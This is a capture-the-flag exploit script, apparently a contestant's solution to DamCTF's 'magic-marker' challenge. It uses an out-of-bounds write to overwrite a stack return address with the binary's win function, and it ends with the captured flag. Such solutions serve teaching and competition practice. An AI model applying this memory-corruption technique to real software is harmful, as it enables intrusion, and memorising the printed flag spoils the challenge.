#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template magic-marker
import random
from pwn import ELF, remote, process, u64, p64, FmtStr, args, gdb, context, pause, fmtstr_payload, log
from difflib import Differ

HOST, PORT = "chals.damctf.xyz 31313".split(" ")

# Set up pwntools for the correct architecture
exe = context.binary = ELF('magic-marker')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

def read_map(find=False):
    map = ""
    row = column = 0
    for i in range(81):
        map += io.recvline().decode()
        if not row and find and "*" in map:
            srow = map.split("\n")[-2]
            column = srow.find("*")
            row = i

    if find:
        return row, column
    return map

io = start()

io.recvuntil(b"What would you like to do?\n")
io.sendline(b"jump up and down")

# the address of buffer to which we are writing is calculated using
# followin formula:
# local_c848 is a variable on stack
# I suppose uVar6 and lVar4 are X and Y
# going west decrements uVar6
# going east increments uVar6
# going south increments lVar4
# going north decrements lVar4
# address of local_c848 is x
# address of auStack51244 is x+28
# address of return address is x+28+12795+16=x+12839
# fgets(local_c848 + (uVar6 + lVar4 * 0x28) * 0x20,0x21,stdin);

io.recvuntil(b"): ")
io.sendline(b"x")
io.recvuntil(b"write?\n")
io.sendline(b"\x0f"*0x1f)

io.recvuntil(b"): ")
io.sendline(b"m")
c_row, c_column = read_map(find=True)
log.info(f"row: {c_row}, column: {c_column}")
# go as far to the south as it is possible
while True:
    io.recvuntil(b"): ")
    io.sendline(b"s")
    c_row += 2
    io.recvuntil(b"): ")
    io.sendline(b"x")
    io.recvuntil(b"write?\n")
    io.sendline(b"\x0f"*0x1f)
    log.info(f"row: {c_row}")
    if c_row == 79:
        break

# go as far to the east as possible
while True:
    io.recvuntil(b"): ")
    io.sendline(b"a")
    c_column -= 4
    io.recvuntil(b"): ")
    io.sendline(b"x")
    io.recvuntil(b"write?\n")
    io.sendline(b"\x0f"*0x1f)
    log.info(f"column: {c_column}")
    if c_column == 14:
        break

# go east
io.recvuntil(b"): ")
io.sendline(b"s")
io.recvuntil(b"): ")
io.sendline(b"x")
io.recvuntil(b"write?\n")
io.sendline(b"\x0f"*0x1f)

io.recvuntil(b"): ")
io.sendline(b"a")
io.recvuntil(b"): ")
io.sendline(b"x")
io.recvuntil(b"write?\n")
io.sendline(p64(exe.sym.win)*2)

io.recvuntil(b"): ")
io.sendline(b"q")

io.interactive()

# Congratulations! You escaped the maze and got the flag!
# dam{m4rvellOU5lY_M49n1f1cen7_m491C_m4rker5_M4KE_M4zE_M4n1PuL471oN_M4R91N4llY_M4L1c1Ou5}

